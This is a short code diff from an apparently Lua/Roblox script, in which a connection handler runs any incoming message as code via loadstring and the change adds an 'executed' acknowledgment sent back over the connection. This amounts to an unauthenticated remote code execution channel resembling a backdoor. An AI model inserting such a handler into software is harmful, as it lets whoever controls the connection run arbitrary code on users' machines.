@@ -10,7 +10,8 @@ while task.wait(1) do
             if message == "2"  then
                 connection:Send("3")
             else   
-                loadstring(message)()
+                loadstring(message)()    
+                connection:Send("executed")
             end
         end)
 
